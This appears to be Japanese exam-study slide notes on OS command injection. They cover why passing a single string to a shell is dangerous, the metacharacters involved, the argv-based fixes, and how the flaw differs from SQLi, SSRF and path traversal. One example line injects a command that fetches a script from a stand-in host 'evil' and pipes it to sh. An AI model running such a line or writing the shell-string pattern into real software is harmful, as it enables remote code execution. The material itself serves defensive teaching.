【登録セキスペ 第14回】OSコマンドインジェクション

第13回は ファイルを開くパス。今回は シェルが一行を解釈してプロセス起動。| ; などで命令が連なる。

  • 試験の軸：シェル非使用・argv 分離・メタ文字・SQLi / SSRF / 第13回との切り分け
  • 図の見方：アプリ → シェル → OS のどこで壊れるか

学習用フル図解: s01-ep14-command-injection-study-slides.html

3段階

Webアプリ → シェル（sh / cmd）→ OS

対策の本命は ②を経由しない（exec + argv）。「サニタイズしたから安全」より試験ではシェル非使用が正解側。

欠陥の核

固定文字列 + 入力 を 1本のシェル行 にする — が典型

危険
sh -c "ping … "+input 型。クォートはみ出しも頻出。
望ましい
argv[0]=ping, argv[1]=… の配列渡し。シェル不在。

記述問題では「エスケープ追加」より「起動方法の変更」が高得点ラインになりやすい。

メタ文字

; | && || `…` $() — 一行に複数の文

ping 127.0.0.1 ; curl http://evil/x | sh

記号の暗記より「シェルに一行渡すな」が本質。禁止リストは迂回されやすい。

ブラインド

画面に出なくても — 遅延・外向きHTTP・DNS 等で実行を推測

  • 対策の本質は同じ：シェル経由の任意実行を許さない
発生箇所

ping / nslookup、ffmpeg、バッチ呼び出し — 「CLIを便利に」ほどハマる

  • 診断：管理画面に露出しがち
  • メディア：ファイル名・パスに入力が混ざる
  • メンテ：HTTP パラメータが引数に直結
対策①

シェルを起動しない — execve 系で argv 配列

推奨
コマンドパス固定・引数は第二引数以降
避ける
文字列一本で渡す API（言語により名称不同）

同じ ping でも、呼び方で安全性が変わる — 試験の定番。

対策②

機能を狭める・ネットワーク分離・低権限・コンテナ

  • 任意ホストへの ping を公開しない／VPN・管理者のみ など
  • WAF 万能論・禁止文字だけ、より 機能削減・権限最小化 が並ぶ
対策③

入力を受けるなら ホワイトリスト＋形式検証

危険文字の列挙より「許可する形だけ」。ホスト名なら FQDN 文法 + 解決先の許可リスト、など。最後の砦はやはりシェル非使用。

混同ゼロ

入力が効く「エンジン」で切る

  • OSコマンド注入：シェル／OS が実行
  • SQLi（5回）：DB がクエリを誤解釈
  • SSRF（11回）：サーバが HTTP で取りに行く
  • パストラ（13回）：ローカルファイル読取 — 実行とは別軸
試験

短絡しやすい誤答パターン

  • ① エスケープだけあれば絶対安全 — 抜け道の話が教科書に載る
  • ② WAF があればコマンド注入も丸ごと防げる — レイヤが違う
  • ③ 第13回の対策をそのまま当てはめる — 読取と実行は別
